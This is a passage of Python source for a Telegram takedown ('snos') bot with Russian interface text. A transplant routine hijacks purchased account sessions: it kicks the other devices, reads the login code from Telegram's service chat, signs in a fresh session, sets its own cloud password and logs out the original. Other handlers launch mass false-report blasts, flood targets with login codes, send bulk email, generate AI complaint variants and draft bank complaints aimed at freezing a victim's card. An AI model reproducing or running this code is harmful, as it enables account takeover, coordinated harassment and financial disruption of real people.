        m = rx.search(text or "")
        return m.group(1) if m else None

    def _offer(text: str, where: str, date=None) -> None:
        code = _pick(text)
        if not code or fut.done():
            return
        if after_ts is not None and date is not None:
            try:
                if float(date.timestamp()) < after_ts - 10:
                    log.info("transplant: stale code ignored (%s)", where)
                    return
            except Exception:
                pass
        log.info("transplant: code via %s — %s", where, code[:2] + "***")
        fut.set_result(code)

    async def _h(event):
        msg = event.message
        _offer(getattr(msg, "text", None) or getattr(msg, "message", None)
               or "", "update", getattr(msg, "date", None))

    client.add_event_handler(_h, _tlev.NewMessage(incoming=True))

    async def _poll_service_code():
        seen_n = -1
        while not fut.done():
            try:
                msgs = await asyncio.wait_for(
                    client.get_messages(777000, limit=5), timeout=12)
                if seen_n < 0:
                    log.info("transplant: 777000 history=%s", len(msgs))
                    seen_n = len(msgs)
                for m in msgs:
                    _offer(getattr(m, "message", None) or "", "poll",
                           getattr(m, "date", None))
                    if fut.done():
                        break
            except asyncio.CancelledError:
                return
            except Exception as e:
                log.warning("transplant: 777000 poll failed: %s", e)
            await asyncio.sleep(5)

    poller = asyncio.create_task(_poll_service_code())
    try:
        return await asyncio.wait_for(fut, timeout=timeout)
    except asyncio.TimeoutError:
        return None
    finally:
        poller.cancel()
        client.remove_event_handler(_h)


async def _transplant_one(sess: Path) -> bool:
    """Полный цикл пересадки одной lolz-сессии. True = успех."""
    from telethon.errors import FloodWaitError, SessionPasswordNeededError
    from telethon.tl.functions.auth import (
        ResetAuthorizationsRequest, SendCodeRequest, SignInRequest,
    )
    from telethon.tl.types import CodeSettings

    name = sess.stem
    if name in TRANSPLANT_EXCLUDE_STEMS:
        log.info("transplant %s: excluded by name", name)
        return False
    if (TRANSPLANT_READY / f"{name}_new.session").exists():
        log.info("transplant %s: already transplanted — waiting for admin", name)
        await _transplant_drop_source(sess)
        return True
    if (SESSIONS_DIR / f"{name}_new.session").exists():
        log.info("transplant %s: new session already in pool — dropping source",
                 name)
        await _transplant_drop_source(sess)
        return True
    async with _transplant_sem:
        api_id, api_hash = random.choice(_TRANSPLANT_API_PAIRS)
        old = TelegramClient(str(sess), api_id, api_hash,
                             system_version="4.16.30-vxCUSTOM")
        try:
            await asyncio.wait_for(old.connect(), timeout=15)
            if not await old.is_user_authorized():
                log.warning("transplant %s: not authorized — archiving", name)
                await old.disconnect()
                await _transplant_archive_source(sess)
                return False
            me = await old.get_me()
            phone = (me.phone or "").lstrip("+")
            if phone in TRANSPLANT_EXCLUDE_PHONES:
                log.info("transplant %s: +%s protected — skip", name, phone)
                await old.disconnect()
                return False
            # 0. backup + verified push BEFORE any destructive step: the
            #    runner disk dies with the job, the repo does not
            if not await _transplant_backup(sess):
                log.warning("transplant %s: backup push failed — abort", name)
                await old.disconnect()
                return False

            # 1. KICK FIRST — age gate above guarantees this session is old
            #    enough for Telegram to accept ResetAuthorizations. With the
            #    other devices gone the App code lands in this lolz session.
            log.info("transplant %s: kicking other sessions", name)
            try:
                await old(ResetAuthorizationsRequest())
                log.info("transplant %s: other sessions kicked", name)
            except FloodWaitError as e:
                log.warning("transplant %s: kick FloodWait %ss", name, e.seconds)
                await old.disconnect()
                return False
            except Exception as e:
                log.warning("transplant %s: kick failed: %s", name, e)
                await old.disconnect()
                return False
            await asyncio.sleep(2)

            # 2. запрашиваем код входа на новой сессии
            new_api_id, new_api_hash = random.choice(_TRANSPLANT_API_PAIRS)
            new_path = TRANSPLANT_OUT / f"{name}_new"
            new = TelegramClient(str(new_path), new_api_id, new_api_hash,
                                 system_version="4.16.30-vxCUSTOM")
            try:
                await asyncio.wait_for(new.connect(), timeout=15)
                code_sent_at = time.time()
                sent = await asyncio.wait_for(new(SendCodeRequest(
                    phone_number=f"+{phone}",
                    api_id=new_api_id,
                    api_hash=new_api_hash,
                    settings=CodeSettings(),
                )), timeout=60)
                phone_code_hash = sent.phone_code_hash
                log.info("transplant %s: code requested | type=%s next=%s "
                         "timeout=%s", name,
                         type(getattr(sent, "type", None)).__name__,
                         type(getattr(sent, "next_type", None)).__name__,
                         getattr(sent, "timeout", None))
            except Exception as e:
                log.warning("transplant %s: send code failed: %s", name, e)
                try:
                    await new.disconnect()
                except Exception:
                    pass
                await old.disconnect()
                _transplant_cleanup_partial(new_path)
                return False

            # 3. читаем код через старую сессию, с прогрессом в лог
            _code_task = asyncio.create_task(
                _transplant_read_code(old, TRANSPLANT_CODE_WAIT,
                                      code_sent_at))
            _t0 = time.time()
            while not _code_task.done():
                await asyncio.sleep(20)
                if not _code_task.done():
                    log.info("transplant %s: waiting for code %ss/%ss", name,
                             int(time.time() - _t0), TRANSPLANT_CODE_WAIT)
            code = _code_task.result()
            if not code:
                log.warning("transplant %s: no code in %ss", name,
                            TRANSPLANT_CODE_WAIT)
                try:
                    await new.disconnect()
                except Exception:
                    pass
                await old.disconnect()
                _transplant_cleanup_partial(new_path)
                return False

            # 4. авторизуем новую сессию (облачный пароль, если стоит)
            log.info("transplant %s: signing in new session", name)
            try:
                await new(SignInRequest(
                    phone_number=f"+{phone}",
                    phone_code_hash=phone_code_hash,
                    phone_code=code,
                ))
            except SessionPasswordNeededError:
                try:
                    await new.sign_in(password=TRANSPLANT_CLOUD_PASS)
                except Exception as e:
                    log.warning("transplant %s: password sign-in failed: %s",
                                name, e)
                    try:
                        await new.disconnect()
                    except Exception:
                        pass
                    await old.disconnect()
                    _transplant_cleanup_partial(new_path)
                    return False
            except Exception as e:
                log.warning("transplant %s: sign in failed: %s", name, e)
                try:
                    await new.disconnect()
                except Exception:
                    pass
                await old.disconnect()
                _transplant_cleanup_partial(new_path)
                return False
            log.info("transplant %s: new session authorized", name)

            # 4b. prove the new session is the same account before anything
            #     irreversible happens to the old one
            new_me = None
            try:
                new_me = await new.get_me()
            except Exception as e:
                log.warning("transplant %s: get_me on new failed: %s", name, e)
            if not new_me or new_me.id != me.id:
                log.warning("transplant %s: new identity mismatch "
                            "(old %s, new %s) — old kept",
                            name, getattr(me, "id", "?"),
                            getattr(new_me, "id", "?"))
                _transplant_cleanup_partial(new_path)
                try:
                    await new.disconnect()
                except Exception:
                    pass
                await old.disconnect()
                return False

            # 4c. fingerprint json: the bot must reconnect with the SAME
            #     api pair that authorized this session
            fp_new = {"app_id": int(new_api_id), "app_hash": new_api_hash,
                      "device": "Desktop", "sdk": "Windows 10",
                      "app_version": "4.16.30 x64", "lang_code": "en",
                      "system_lang_code": "en-US", "phone": f"+{phone}"}
            try:
                (TRANSPLANT_OUT / f"{name}_new.json").write_text(
                    json.dumps(fp_new, ensure_ascii=False, indent=1),
                    encoding="utf-8")
            except Exception as e:
                log.warning("transplant %s: fp write failed: %s", name, e)

            # 4d. persist the new session to the repo BEFORE logging the old
            #     one out; a failed push leaves BOTH sessions alive
            if not await _persist_paths([f"lolz/_ready/{name}_new.session",
                                        f"lolz/_ready/{name}_new.json"],
                                       f"transplant: {name}_new ready"):
                log.warning("transplant %s: new session push failed — old "
                            "session kept, retry next sweep", name)
                try:
                    await new.disconnect()
                except Exception:
                    pass
                await old.disconnect()
                return False

            # 5. облачный пароль через старую сессию
            try:
                await old.edit_2fa(new_password=TRANSPLANT_CLOUD_PASS, hint="")
                log.info("transplant %s: cloud password set", name)
            except Exception as e:
                log.warning("transplant %s: 2fa set failed: %s", name, e)

            # 6. logout старой + удаление файлов
            try:
                await old.log_out()
            except Exception:
                pass
            try:
                await old.disconnect()
            except Exception:
                pass
            for ext in (".session", ".session-journal"):
                try:
                    Path(str(sess) + ext).unlink(missing_ok=True)
                except Exception as e:
                    log.warning("transplant %s: remove failed: %s", name, e)
            await _transplant_drop_source(sess)
            try:
                await new.disconnect()
            except Exception:
                pass
            await push_send_log(
                "Пересадка lolz",
                [f"✅ <code>{html_mod.escape(name)}_new</code> — +{phone}",
                 "🔁 старая сессия выведена, облачный пароль стоит"])
            ready = len(list(TRANSPLANT_READY.glob("*_new.session")))
            await notify_admin_ready(name, phone, ready)
            log.info("transplant %s: done → lolz/_ready/%s_new.session",
                     name, name)
            return True
        except Exception as e:
            log.error("transplant %s: unexpected: %s", name, e)
            try:
                await old.disconnect()
            except Exception:
                pass
            return False


async def transplant_loop() -> None:
    if os.getenv("TRANSPLANT_WORKER", "0") != "1":
        log.info("transplant worker: off in the bot process "
                 "(lolz-transplant workflow owns it)")
        return
    log.info("transplant worker: sweep every %ss", TRANSPLANT_INTERVAL)
    await asyncio.sleep(TRANSPLANT_START_DELAY)
    while True:
        try:
            sessions = _transplant_due_list()
            if sessions:
                log.info("transplant: %d lolz sessions due", len(sessions))
                for s in sessions:
                    try:
                        res = await _transplant_one(s)
                    except Exception as e:
                        log.warning("transplant %s crashed: %s", s.stem, e)
                        res = False
                    await _transplant_mark(s, res is True)
        except asyncio.CancelledError:
            return
        except Exception as e:
            log.warning("transplant loop: %s", e)
        await asyncio.sleep(TRANSPLANT_INTERVAL)


# ── one active report blast per method, across all users ──
METHOD_BUSY: dict[str, asyncio.Task] = {}


def method_busy(method: str) -> bool:
    task = METHOD_BUSY.get(method)
    return bool(task is not None and not task.done())


def method_busy_wait_text(method: str, hint: str = "и попробуй ещё раз.") -> str:
    label = METHODS.get(method, {}).get("l", method)
    return (f"⏳ <b>Метод «{html_mod.escape(str(label))}» занят.</b>\n"
            f"Предыдущая жалоба ещё отправляется. "
            f"Подожди, пока она закончится, {hint}")


def track_report(method: str, coro) -> asyncio.Task | None:
    """Claim the method slot atomically; None = ask the user to wait."""
    if method_busy(method):
        try:
            coro.close()
        except Exception:
            pass
        return None
    task = asyncio.create_task(coro)
    METHOD_BUSY[method] = task

    def _release(done: asyncio.Task) -> None:
        if METHOD_BUSY.get(method) is done:
            METHOD_BUSY.pop(method, None)

    task.add_done_callback(_release)
    return task


async def report_gate_block(uid: int, method: str) -> str | None:
    """Shared launch gate: active blast, wash, 20min CD, 400s rest.
    Admin skips cooldowns but never jumps a running blast."""
    if method_busy(method):
        return method_busy_wait_text(method)
    if user_is_admin(uid):
        return None
    if await wash_active_seconds():
        return "Сессии на данный момент обновляются. Подождите 5 минут."
    _cd = await method_cooldown_left(uid, method)
    if _cd:
        return f"Метод доступен через {_cd} сек. Дай сессиям отдохнуть."
    _rest = sessions_rest_left()
    if _rest:
        return f"Сессии остывают. Попробуйте через {_rest} секунд."
    await method_cooldown_set(uid, method)
    return None


@router.message(Report.target)
async def got_target(msg: Message, state: FSMContext):
    _m = (await state.get_data()).get("method")
    if _m == "account":
        target = parse_target(msg.text or "")
        if not target["entity"]:
            await msg.answer("❌ Неверная цель. Пришли @username.")
            return
        _block = await report_gate_block(msg.from_user.id, "account")
        if _block:
            await msg.answer(_block, parse_mode=ParseMode.HTML)
            return
        _acct_task = track_report("account", fire_profile_reports(
            target["entity"], PROFILE_REPORT_TEXT))
        if _acct_task is None:
            await msg.answer(_cx(method_busy_wait_text(
                "account", "и пришли цель ещё раз.")), parse_mode=ParseMode.HTML)
            return
        await state.clear()
        await msg.answer(_cx(
            bq(f"<b>{NAME}</b>  —  👤 Аккаунт")
            + f"\n\n🎯 Цель: <code>{html_mod.escape(str(target['raw']))}</code>"
            + "\n\nЖалоба отправлена."),
            parse_mode=ParseMode.HTML)
        return
    if _m == "session":
        parts = (msg.text or "").split()
        uname = parts[0].lstrip("@") if parts else ""
        phone = _norm_phone(parts[1]) if len(parts) > 1 else ""
        if not uname or not phone:
            await msg.answer(_cx("\u274c \u041d\u0443\u0436\u043d\u043e: <code>@username +79991234567</code>"),
                             parse_mode=ParseMode.HTML)
            return
        await state.update_data(
            target={"raw": f"@{uname} {phone}", "entity": uname,
                    "msg_id": None, "type": "session", "phone": phone})
        await state.update_data(comment="")
        data = await state.get_data()
        await msg.answer(_cx(summary_text(data)), parse_mode=ParseMode.HTML,
                         reply_markup=kb_confirm())
        await state.set_state(Report.confirm)
        return
    if _m == "code":
        phone = _norm_phone(msg.text or "")
        if not phone:
            await msg.answer(_cx("\u274c \u041D\u0443\u0436\u0435\u043D \u043D\u043E\u043C\u0435\u0440: <code>+79991234567</code>"),
                             parse_mode=ParseMode.HTML)
            return
        await state.update_data(target={"raw": phone, "entity": phone,
                                        "msg_id": None, "type": "phone"})
        data = await state.get_data()
        data["comment"] = ""
        await state.update_data(comment="")
        await msg.answer(_cx(summary_text(data)), parse_mode=ParseMode.HTML,
                         reply_markup=kb_confirm())
        await state.set_state(Report.confirm)
        return
    target = parse_target(msg.text or "")
    if not target["entity"]:
        await msg.answer("\u274c \u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0446\u0435\u043B\u044C. \u041F\u043E\u043F\u0440\u043E\u0431\u0443\u0439\u0442\u0435 \u0441\u043D\u043E\u0432\u0430.")
        return
    if _m == "message" and not target.get("msg_id"):
        await msg.answer(_cx("❌ Нужна ссылка на сообщение."),
                         parse_mode=ParseMode.HTML)
        return
    if _m == "telegraph" and not re.search(r"(telegra\.ph|graph\.org)",
                                           msg.text or "", re.I):
        await msg.answer(_cx("❌ Нужна ссылка на статью telegra.ph."),
                         parse_mode=ParseMode.HTML)
        return
    if _m == "channel":
        await state.update_data(target=target, comment="", variants=None)
        data = await state.get_data()
        await msg.answer(_cx(summary_text(data)), parse_mode=ParseMode.HTML,
                         reply_markup=kb_confirm())
        await state.set_state(Report.confirm)
        return
    if _m == "bot":
        rk = (await state.get_data()).get("reason") or "personal"
        text = bot_reason_text(rk)
        await state.update_data(target=target, comment=text,
                                variants=[text])
        data = await state.get_data()
        await msg.answer(_cx(summary_text(data)), parse_mode=ParseMode.HTML,
                         reply_markup=kb_confirm())
        await state.set_state(Report.confirm)
        return
    if (has_premium(load_subs(), msg.from_user.id)
            and _m not in ("code", "mail")):
        await state.update_data(target=target)
        await msg.answer(
            _cx(bq(f"<b>{NAME}</b>")
                + "\n\n\u270d\ufe0f <b>\u0422\u0435\u043a\u0441\u0442 \u0436\u0430\u043b\u043e\u0431\u044b:</b>"
                + "\n\n\U0001f916 \u0418\u0418 \u2014 8 \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u0445 "
                  "\u0442\u0435\u043a\u0441\u0442\u043e\u0432 \u043f\u043e \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u043c\u0443 "
                  "\u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044e"
                + "\n\u270d\ufe0f \u0421\u0432\u043e\u0439 \u2014 \u043d\u0430\u043f\u0438\u0448\u0435\u0448\u044c "
                  "\u0442\u0435\u043a\u0441\u0442 \u0441\u0430\u043c"),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="\U0001f916 \u0418\u0418 (8 \u0442\u0435\u043a\u0441\u0442\u043e\u0432)",
                                      callback_data="txt:ai")],
                [InlineKeyboardButton(text="\u270d\ufe0f \u0421\u0432\u043e\u0439 \u0442\u0435\u043a\u0441\u0442",
                                      callback_data="txt:custom")],
            ]))
        await state.set_state(Report.text_choice)
        return
    await state.update_data(target=target, comment="")
    # text step: user picks their own complaint text or the auto template pool
    data = await state.get_data()
    await msg.answer(_cx(comment_step_text(data)),
                     parse_mode=ParseMode.HTML,
                     reply_markup=kb_comment_step())
    await state.set_state(Report.comment)


@router.callback_query(Report.bank, F.data.startswith("bank:"))
async def got_bank(cb: CallbackQuery, state: FSMContext):
    key = cb.data.split(":", 1)[1]
    if key not in BANK_NAMES:
        await cb.answer("\u274c", show_alert=True)
        return
    await state.update_data(bank=key)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>")
            + f"\n\n\U0001f3e6 <b>{BANK_NAMES[key]}</b>\n\n"
            + "\U0001f4b3 \u041f\u0440\u0438\u0448\u043B\u0438 <b>\u0434\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B</b> \u043E\u0434\u043D\u0438\u043C \u0441\u043E\u043E\u0431\u0449\u0435\u043D\u0438\u0435\u043C:\n"
            + "\u2022 <code>4276 3801 2345 6789, 12/27, \u0418\u0432\u0430\u043D\u043E\u0432 \u0418.</code>"
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")],
        ]),
    )
    await state.set_state(Report.bank_card)
    await cb.answer()


@router.message(Report.bank_card)
async def got_bank_card(msg: Message, state: FSMContext):
    data = await state.get_data()
    bank = data.get("bank", "tbank")
    card = (msg.text or "").strip()
    if not card:
        await msg.answer(_cx("\u274c \u041F\u0443\u0441\u0442\u043E. \u041F\u0440\u0438\u0448\u043B\u0438 \u0434\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B."),
                         parse_mode=ParseMode.HTML)
        return
    complaint = BANK_COMPLAINT.format(bank=BANK_NAMES[bank], card=card)
    try:
        await msg.delete()
    except Exception:
        pass
    set_current_user(f"{msg.from_user.full_name} ( id {msg.from_user.id} )")
    await msg.answer(_cx(
        bq(f"<b>{NAME}</b>  \u00b7  \U0001f3e6 \u0417\u0430\u044F\u0432\u043A\u0430 \u0433\u043E\u0442\u043E\u0432\u0430")
        + "\n\n\u0411\u0430\u043D\u043A: <b>" + BANK_NAMES[bank] + "</b>"
        + "\n\u0421\u0440\u043E\u043A \u043F\u043E 115-\u0424\u0417 \u2014 \u0434\u043E 3 \u0440\u0430\u0431\u043E\u0447\u0438\u0445 \u0434\u043D\u0435\u0439."),
        parse_mode=ParseMode.HTML)
    await msg.answer(_cx(
        "<code>" + html_mod.escape(complaint) + "</code>"),
        parse_mode=ParseMode.HTML)
    await push_send_log(
        "\u0411\u0430\u043D\u043A-\u0437\u0430\u044F\u0432\u043A\u0430 (115-\u0424\u0417)",
        [f"\U0001f3e6 {BANK_NAMES[bank]}",
         f"\U0001f4b3 <code>{html_mod.escape(card)}</code>",
         f"\U0001f464 {html_mod.escape(msg.from_user.full_name)} (<code>{msg.from_user.id}</code>)"])
    await state.clear()


@router.callback_query(Report.text_choice, F.data == "txt:custom")
async def txt_custom(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    await state.set_state(Report.comment)
    try:
        await safe_edit(cb.message, _cx(comment_step_text(data)),
                        parse_mode=ParseMode.HTML,
                        reply_markup=kb_comment_step())
    except Exception:
        pass
    await cb.answer()


@router.callback_query(Report.text_choice, F.data == "txt:ai")
async def txt_ai(cb: CallbackQuery, state: FSMContext):
    await cb.answer()
    try:
        await safe_edit(cb.message,
                        _cx("\U0001f916 \u0413\u0435\u043d\u0435\u0440\u0438\u0440\u0443\u044e "
                            "8 \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u0445 "
                            "\u0442\u0435\u043a\u0441\u0442\u043e\u0432\u2026"),
                        parse_mode=ParseMode.HTML)
    except Exception:
        pass
    d = await state.get_data()
    target = d.get("target")
    if not target:
        await cb.message.answer("\u041d\u0430\u0436\u043c\u0438 \u00ab\u0417\u0430\u043f\u0443\u0441\u043a\u00e9 \u0437\u0430\u043d\u043e\u0432\u043e", show_alert=True)
        return
    try:
        from free_llm import generate_complaint_variants
        rk = d.get("reason") or "other"
        key = f"{target.get('raw')}|{rk}"
        variants = _VARIANTS_CACHE.get(key)
        if not variants:
            body = _BODY_CACHE.get(key)
            if body is None:
                body = await fetch_message_body(target["entity"],
                                                target.get("msg_id"))
                if not body:
                    body = str(target.get("raw") or "")
                _BODY_CACHE[key] = body
            variants = await asyncio.wait_for(
                generate_complaint_variants(
                    REASONS.get(rk, REASONS["other"])["l"], "", body),
                timeout=50)
            _VARIANTS_CACHE[key] = variants
        await state.update_data(variants=variants, comment=variants[0])
        await cb.message.answer(_cx(summary_text(await state.get_data())),
                                parse_mode=ParseMode.HTML,
                                reply_markup=kb_confirm())
        await state.set_state(Report.confirm)
    except asyncio.TimeoutError:
        await cb.message.answer(
            "\u26a0\ufe0f \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f "
            "\u043d\u0435 \u0443\u0441\u043f\u0435\u043b\u0430. "
            "\u041d\u0430\u0436\u043c\u0438 \u00ab\u0421\u0432\u043e\u0439 \u0442\u0435\u043a\u0441\u0442\u00e9 "
            "\u0438\u043b\u0438 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439 "
            "\u0418\u0418 \u0435\u0449\u0435 \u0440\u0430\u0437.")
    except Exception as e:
        log.warning("premium variants failed: %s", e)
        await cb.message.answer(
            f"\u26a0\ufe0f {type(e).__name__}. "
            "\u0412\u044b\u0431\u0435\u0440\u0438 \u00ab\u0421\u0432\u043e\u0439 "
            "\u0442\u0435\u043a\u0441\u0442\u00e9.")


@router.callback_query(Report.reason, F.data.startswith("reason:"))
async def got_reason(cb: CallbackQuery, state: FSMContext):
    key = cb.data.split(":", 1)[1]
    _d0 = await state.get_data()
    if _d0.get("method") == "account":
        key = "drugs"
    if not (_d0.get("method") == "channel" and key in CHANNEL_REASONS):
        if key not in REASONS:
            await cb.answer("\u274c", show_alert=True)
            return
    await state.update_data(reason=key)
    data = await state.get_data()
    m = METHODS[data["method"]]
    r = reason_meta(key)
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>")
            + f"\n\n{r['e']} <b>{r['l']}</b>\n\n"
            + f"\U0001f50d {m['hint']}"
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:reasons")],
        ]),
    )
    await state.set_state(Report.target)
    await cb.answer()


@router.callback_query(F.data == "back:reasons")
async def back_reasons(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    m = METHODS.get(data.get("method", "message"), METHODS["message"])
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>")
            + f"\n\n{m['e']} <b>{m['l']}</b>\n\n"
            + "\u26a0\ufe0f \u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0436\u0430\u043b\u043e\u0431\u044b:"
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_reasons(data.get("method") or ""),
    )
    await state.set_state(Report.reason)
    await cb.answer()


@router.callback_query(Report.comment, F.data == "skip_comment")
async def skip_comment(cb: CallbackQuery, state: FSMContext):
    await state.update_data(comment="")
    data = await state.get_data()
    await safe_edit(cb.message,
        summary_text(data), parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
    await state.set_state(Report.confirm)
    await cb.answer()


@router.message(Report.comment)
async def got_comment(msg: Message, state: FSMContext):
    await state.update_data(comment=(msg.text or "").strip()[:3800])
    data = await state.get_data()
    await msg.answer(_cx(
        summary_text(data)), parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
    await state.set_state(Report.confirm)


@router.callback_query(Report.comment, F.data == "cmt:custom")
async def cmt_custom(cb: CallbackQuery, state: FSMContext):
    await safe_edit(cb.message, _cx(
        bq(f"<b>{NAME}</b>  —  Свой текст")
        + "\n\n✍️ Пришли текст жалобы одним сообщением — он уйдёт "
        "в каждую жалобу как есть."),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="cmt:menu")],
        ]))
    await cb.answer()


@router.callback_query(Report.comment, F.data == "cmt:auto")
async def cmt_auto(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    _fixed = METHOD_TEXT_OVERRIDES.get((data.get("method"), data.get("reason")))
    await state.update_data(comment=_fixed or "")
    await safe_edit(cb.message, _cx(summary_text(data)),
                    parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
    await state.set_state(Report.confirm)
    await cb.answer()


@router.callback_query(Report.comment, F.data == "cmt:menu")
async def cmt_menu(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    await safe_edit(cb.message, _cx(comment_step_text(data)),
                    parse_mode=ParseMode.HTML, reply_markup=kb_comment_step())
    await cb.answer()


@router.callback_query(Report.comment, F.data == "cmt:back")
async def cmt_back(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    m = METHODS.get(data.get("method", "message"), METHODS["message"])
    await safe_edit(cb.message, _cx(
        bq(f"<b>{NAME}</b>")
        + f"\n\n{m['e']} <b>{m['l']}</b>"
        + "\n\n⚠️ Выберите причину жалобы:"),
        parse_mode=ParseMode.HTML, reply_markup=kb_reasons(data.get("method") or ""))
    await state.set_state(Report.reason)
    await cb.answer()


@router.callback_query(Report.confirm, F.data.startswith("confirm:"))
async def got_confirm(cb: CallbackQuery, state: FSMContext):
    action = cb.data.split(":", 1)[1]
    if action != "yes":
        caption = hero_caption(cb.from_user.id)
        try:
            await cb.message.delete()
        except Exception:
            pass
        await send_hero(
            cb.message,
            caption=_cx(caption),
            parse_mode=ParseMode.HTML,
            reply_markup=kb_main(cb.from_user.id),
        )
        await state.clear()
        await cb.answer()
        return

    await cb.answer()   # ack before slow GitHub reads
    data = await state.get_data()
    t = data["target"]
    _block = await report_gate_block(cb.from_user.id, data.get("method", ""))
    if _block:
        await cb.message.answer(_block, parse_mode=ParseMode.HTML)
        return
    r = reason_meta(data.get("reason") or "spam")
    m = METHODS[data["method"]]
    c = data.get("comment", "")   # empty = per-session unique templates downstream
    variants = data.get("variants")
    ts = datetime.now().strftime("%H:%M:%S")

    if cb.from_user:
        set_current_user(f"{cb.from_user.full_name} ( id {cb.from_user.id} )")

    is_web = data["method"] == "web"
    # what actually goes out when the admin skipped the comment step —
    # resolved here so the pool log shows the real payload, not "нет"
    c_display = c
    if not c_display:
        if data["method"] == "code":
            c_display = "\u043a\u043e\u0434\u044b \u0432\u0445\u043e\u0434\u0430 (\u0431\u0435\u0437 \u0442\u0435\u043a\u0441\u0442\u0430 \u0436\u0430\u043b\u043e\u0431\u044b)"
        else:
            c_display = pick_comment(data["reason"], data["method"])
    if data["method"] == "account":
        c_display = PROFILE_REPORT_TEXT
    if is_web:
        unit_name = "\u0437\u0430\u044f\u0432\u043e\u043a"
    elif data["method"] == "mail":
        unit_name = "\u043f\u0438\u0441\u0435\u043c"
    else:
        unit_name = "\u0437\u0430\u043f\u0443\u0441\u043a\u043e\u0432"
    tgt_raw = t["raw"]
    esc_raw = html_mod.escape(tgt_raw)

    # ── protect gate: every method ──
    probe_note = ""
    hit = is_target_whitelisted(tgt_raw)
    if hit:
        await cb.message.answer("⛔️ Цель в протект-листе!")
        await push_send_log(
            "Попытка снести цель из протект-листа",
            [f"\U0001f3af <code>{esc_raw}</code> (паттерн: <code>{html_mod.escape(hit)}</code>)",
             f"\U0001f464 {html_mod.escape(cb.from_user.full_name)} "
             f"(<code>{cb.from_user.id}</code>) | метод: "
             f"{html_mod.escape(str(data['method']))}"])
        await state.clear()
        return
    if data["method"] == "bot":
        try:
            await cb.message.edit_caption(
                caption=_cx((bq(f"<b>{NAME}</b>  \u00b7  \U0001f916 \u041f\u0440\u043e\u0431\u0430 \u0446\u0435\u043b\u0438")
                         + "\n\n\u23f3 \u041e\u0434\u043d\u0430 \u0441\u0435\u0441\u0441\u0438\u044f \u043f\u0438\u0448\u0435\u0442 \u0431\u043e\u0442\u0443 /start...")),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        pr = await bot_probe_target(tgt_raw)
        if not pr.get("found") and pr.get("error"):
            await cb.message.answer(
                "⚠️ Цель не отвечает: " + pr["error"][:120])
            await state.clear()
            return
        if pr.get("ok"):
            probe_note = ("\n\U0001f916 <b>\u041f\u0440\u043e\u0431\u0430:</b> "
                          + ("\u26a1 \u043a\u0430\u043f\u0447\u0430-\u0431\u043e\u0442 (\u041a\u0414 5 \u043c\u0438\u043d)"
                             if pr.get("captcha") else "\u2705 \u043e\u0442\u0432\u0435\u0447\u0430\u0435\u0442")
                          + (f" | <i>{html_mod.escape(pr.get('preview', '')[:90])}</i>"
                             if pr.get("preview") else ""))
        else:
            probe_note = ("\n\U0001f916 <b>\u041f\u0440\u043e\u0431\u0430:</b> \u26a0\ufe0f "
                          + html_mod.escape(pr.get("error", "\u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d")))
        try:
            await cb.message.edit_caption(
                caption=_cx((bq(f"<b>{NAME}</b>  \u00b7  \U0001f916 \u041f\u0440\u043e\u0431\u0430 \u0446\u0435\u043b\u0438")
                         + "\n\n" + probe_note.lstrip("\n"))),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    # auto-watch every complained entity — no manual target selection needed
    if data["method"] not in ("code", "mail", "telegraph", "session"):
        try:
            _watch_add(cb.from_user.id, tgt_raw)
        except Exception as _wa_err:
            log.warning("auto-watch add failed: %s", _wa_err)

    if data["method"] == "code":
        report_task = track_report(data["method"], code_flood(t["entity"]))
    elif data["method"] == "mail":
        report_task = track_report(data["method"], mail_bulk_send(
            tgt_raw, data["reason"]))
    elif is_web:
        report_task = track_report(data["method"],
            fire_web_reports(tgt_raw, r["l"], c, data["reason"]))
    elif data["method"] == "channel":
        report_task = track_report(data["method"],
            fire_channel_reports(t["entity"], data["reason"], c,
                                 t.get("msg_id"), variants))
    elif data["method"] == "message":
        if not t.get("msg_id"):
            await cb.message.answer("Нужна ссылка на сообщение")
            await state.clear()
            return
        report_task = track_report(data["method"],
            fire_message_reports(t["entity"], c, t["msg_id"], variants,
                                 reason_key=data.get("reason", "other")))
    elif data["method"] == "session":
        report_task = track_report(data["method"],
            fire_session_snos(t["entity"], t.get("phone", ""),
                              cb.from_user.id if cb.from_user else 0))
    elif data["method"] == "telegraph":
        report_task = track_report(data["method"],
            fire_telegraph_snos(tgt_raw, c))
    elif data["method"] == "dsa":
